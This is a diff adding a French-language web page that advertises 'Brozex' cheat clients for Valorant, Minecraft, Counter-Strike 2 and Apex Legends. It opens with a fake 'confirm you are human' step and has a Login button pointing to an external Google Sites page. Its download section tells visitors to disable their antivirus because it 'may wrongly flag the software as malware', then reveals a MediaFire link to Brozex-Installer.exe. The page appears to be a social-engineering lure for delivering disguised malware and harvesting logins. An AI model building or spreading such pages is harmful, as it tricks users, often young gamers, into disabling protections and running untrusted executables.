@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Combinée</title>
+    <style>
+        /* Styles globaux pour la section 1 */
+        body.section1 {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        /* Styles globaux pour la section 2 */
+        body.section2 {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            background-color: #0f0f1a;
+            color: #ffffff;
+        }
+
+        /* Styles globaux pour la section 3 */
+        body.section3 {
+            background-color: #0a0a0a;
+            color: #f5f5f5;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        /* Styles de base pour tout le document */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .section {
+            display: none;
+        }
+        
+        /* Afficher la section active */
+        .section.active {
+            display: block;
+        }
+
+        /* Styles pour la section 1 */
+        .section1 body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .section1 header {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 5rem;
+        }
+        .section1 main {
+            padding: 2rem;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .section1 h1, .section1 h2 {
+            color: #333;
+        }
+        .section1 .login-btn {
+            display: inline-block;
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            border: 2px solid #45a049;
+        }
+        .section1 .login-btn::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
+            z-index: -1;
+            animation: glowing1 20s linear infinite;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            border-radius: 5px;
+        }
+        .section1 .login-btn:hover::before {
+            opacity: 1;
+        }
+        .section1 .login-btn:hover {
+            color: #fff;
+            background-color: transparent;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+        @keyframes glowing1 {
+            0% { background-position: 0 0; }
+            50% { background-position: 400% 0; }
+            100% { background-position: 0 0; }
+        }
+        .section1 .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-top: 2rem;
+        }
+        .section1 .game-card {
+            background-color: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        .section1 .game-card:hover {
+            transform: translateY(-5px);
+        }
+        .section1 .game-card img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+        }
+        .section1 .game-card h3 {
+            padding: 10px;
+            margin: 0;
+            text-align: center;
+            background-color: #333;
+            color: white;
+        }
+        .section1 .titlebrozex {
+            color: #002bff;
+        }
+        .section1 .valoranttitle {
+            color: #ff00c8;
+            text-align: center;
+        }
+        .section1 .valorantimg {
+            width: 99%;
+        }
+
+        /* Styles pour la section 2 */
+        .section2 body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            background-color: #0f0f1a;
+            color: #ffffff;
+        }
+        .section2 header {
+            background-color: #1a1a2e;
+            text-align: center;
+            padding: 1rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .section2 header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, #ff00ff, #00ff00, #ff00ff, #00ff00);
+            animation: glowing2 20s linear infinite;
+            opacity: 0.1;
+            z-index: 1;
+        }
+        .section2 header * {
+            position: relative;
+            z-index: 2;
+        }
+        @keyframes glowing2 {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .section2 main {
+            padding: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .section2 h1, .section2 h2 {
+            color: #4CAF50;
+        }
+        .section2 .download-section {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-top: 2rem;
+        }
+        .section2 .download-image {
+            width: 300px;
+            height: 300px;
+            object-fit: cover;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
+        }
+        .section2 .download-btn {
+            display: inline-block;
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .section2 .download-btn::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff00ff, #00ff00, #00ffff, #ff00ff);
+            z-index: -1;
+            filter: blur(5px);
+            animation: glowing2 20s linear infinite;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
+        .section2 .download-btn:hover::before {
+            opacity: 1;
+        }
+        .section2 .download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(76, 175, 80, 0.8);
+        }
+        .section2 .features {
+            margin-top: 3rem;
+            background-color: #1a1a2e;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(76, 175, 80, 0.3);
+        }
+        .section2 .features ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        .section2 .features li {
+            margin-bottom: 1rem;
+            padding-left: 30px;
+            position: relative;
+        }
+        .section2 .features li::before {
+            content: '✓';
+            color: #4CAF50;
+            position: absolute;
+            left: 0;
+            font-weight: bold;
+        }
+
+        /* Styles pour la section 3 */
+        .section3 body {
+            background-color: #0a0a0a;
+            color: #f5f5f5;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .section3 .container {
+            padding: 20px;
+            margin-top: 50px;
+        }
+        .section3 .warning, .section3 .download-section {
+            margin: 20px auto;
+            padding: 20px;
+            border: 2px solid #28a745;
+            border-radius: 10px;
+            width: 300px;
+            background-color: #1b1b1b;
+        }
+        .section3 .btn {
+            background-color: #28a745;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 10px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .section3 .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    
+    <p>Confirmez que vous êtes humain</p>
+    <a href="#section1">ici</a>
+    <!-- Section 1 -->
+    <section id="section1" class="section">
+        <header>
+            <img src="https://i.imgur.com/AX702Ui.png">
+            <a href="https://sites.google.com/view/connexion-to-brozex" class="login-btn">Login</a>
+        </header>
+        <main>
+            <h2>Bienvenue sur Brozex</h2>
+            <p>Découvrez nos clients personnalisés pour vos jeux préférés :</p>
+            <div class="game-grid">
+                <div class="game-card">
+                    <img src="https://gamefreaks365.com/wp-content/uploads/2022/06/Minecraft-Bedrock-Java-Edition-1536x864.jpg" alt="Minecraft">
+                    <h3>Minecraft</h3>
+                </div>
+                <div class="game-card">
+                    <img src="https://th.bing.com/th/id/OIP.GSnO2Eie9NtsS83kIh-67QHaEK?rs=1&pid=ImgDetMain" alt="Valorant">
+                    <h3>Valorant</h3>
+                </div>
+                <div class="game-card">
+                    <img src="https://th.bing.com/th/id/OIP.rWzDpI0XfaOdEU88H2AOmQAAAA?rs=1&pid=ImgDetMain" alt="Counter-Strike 2">
+                    <h3>Counter-Strike 2</h3>
+                </div>
+                <div class="game-card">
+                    <img src="https://cdn.wccftech.com/wp-content/uploads/2019/02/apex-legends-keyart.jpg" alt="Apex Legends">
+                    <h3>Apex Legends</h3>
+                </div>
+            </div>
+            <p>Nos clients de cheats offrent des fonctionnalités améliorées pour une expérience de jeu optimale.</p>
+            <p>En téléchargant nos clients personnalisés, vous aurez accès à un menu directement dans le jeu permettant d'avoir un avantage sur les ennemis.</p>
+            <p>Vous pouvez téléchargez nos clients de cheats directements à la fin de cette page ou vous pouvez vous connectez ("Login") pour découvrir plus de cheats et recevoir des notifications quand de nouveaux clients de cheats sont mis à jour.</p>
+            <h1 class="valoranttitle">Valorant</h1>
+            <img class="valorantimg" src="https://user-images.githubusercontent.com/125588675/219785125-3b814b78-a19a-4979-84f5-39586127c7a5.png">
+            <p>Version 1.2.4</p>
+            <p> </p>
+            <h1 class="valoranttitle">Minecraft Bedrock</h1>
+            <img class="valorantimg" src="https://data.exloader.net/compressed_images/Paragon/menu.jpg"> 
+            <p>Version 1.21.6+</p>
+            <p> </p>
+            <h1 class="valoranttitle">Counter-Strike 2</h1>
+            <img class="valorantimg" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6gibvC_pDQlAUZDpw5ZUsopsS-wqkMg-nyo4uRoVeqZF8VOU_gscwiySPGXvgG_bipAjwwagIVUWMBNLHKqZHi6Hjww-NLmTOEk83nfj02TiWmeNGQVgBatEEeb304wBoQ6qekjS-EaNC0Q3Ddm45pGp53WKXQpulro57Bi09RDZon59SjPMFIc039y81/s1600/CowNow-AimStar-Counter-Strike-2-Rules-Of-Cheaters.png"> 
+            <p>Version 1.7.8+</p>
+            <p> </p>
+            <h1 class="valoranttitle">Apex-Legends</h1>
+            <img class="valorantimg" src="https://demonicsoftware.net/wp-content/uploads/2023/06/Screenshot2023-04-18113645.png"> 
+            <p>Version 1.7.8+</p>
+            <p> </p>
+            <a href="#section2" class="login-btn">Download Page</a>            
+        </main>
+    </section>
+
+    <!-- Section 2 -->
+    <section id="section2" class="section">
+        <header>
+            <h1>Brozex - Téléchargement</h1>
+        </header>
+        <main>
+            <section class="download-section">
+                <img src="https://i.imgur.com/5mynO3o.png" alt="Brozex Client" class="download-image">
+                <a href="#section3" class="download-btn">Download</a>
+            </section>
+            <section class="features">
+                <h2>Fonctionnalités du client Brozex</h2>
+                <ul>
+                    <li>Interface personnalisable</li>
+                    <li>Optimisation des performances</li>
+                    <li>Mods intégrés pour une expérience améliorée</li>
+                    <li>Compatibilité avec les principaux jeux</li>
+                    <li>Mises à jour automatiques</li>
+                </ul>
+            </section>
+        </main>
+    </section>
+
+    <!-- Section 3 -->
+    <section id="section3" class="section">
+        <div class="container">
+            <h1>Brozex - Téléchargement</h1>
+    
+            <!-- Section Avertissement -->
+            <div id="warningSection" class="warning">
+                <h2>Avertissement</h2>
+                <p>Veuillez désactiver temporairement votre antivirus, car il peut détecter à tort le logiciel comme un malware.</p>
+                <button class="btn" onclick="proceed()">C'est fait !</button>
+            </div>
+    
+            <!-- Section Téléchargement -->
+            <div id="downloadSection" class="download-section hidden">
+                <h2>Télécharger Brozex</h2>
+                <a href="https://download848.mediafire.com/m8n6b5n3cnzgb3QOG0eZyqhDjjONfdDES1wP2tORoRlBouOa-i5AYOpmFdqRcbkM9uRcoW_ndSTv8hp8ciQcRLU0ZiWj3BqmUXi9PixEeIrriitR88LVGEQ6GFYrEW7OnbqJt7PbPtjff-h7DX_Dxh14NpA3_oHNGgmkNRIRThDZ/dtxaje426pfw2u2/Brozex-Installer.exe" class="btn">Télécharger</a>
+            </div>
+        </div>
+    
+        <script>
+            // Fonction pour afficher la section correspondant au hash
+            function showSection() {
+                // Cacher toutes les sections et retirer les classes du body
+                document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+                });
+
+                document.body.className = ''; // Réinitialiser les classes du body
+
+                // Récupérer le hash de l'URL
+                const hash = window.location.hash;
+
+                // Afficher la section correspondant au hash
+                if (hash) {
+                    const section = document.querySelector(hash);
+                    if (section) {
+                        section.classList.add('active');
+
+                        // Ajouter la classe correspondante au body
+                        const sectionClass = hash.replace('#', ''); // ex: "section1"
+                        document.body.classList.add(sectionClass);
+
+                }
+
+            }
+        }
+            // Afficher la section au chargement de la page
+            window.addEventListener('load', showSection);
+
+            // Afficher la section lorsque le hash change
+            window.addEventListener('hashchange', showSection);
+
+        function proceed() {
+            // Cacher la section d'avertissement
+            document.getElementById('warningSection').classList.add('hidden');
+
+            // Afficher la section de téléchargement
+            document.getElementById('downloadSection').classList.remove('hidden');
+        }
+
+
+        </script>
+    </section>
+</body>
+</html>
+
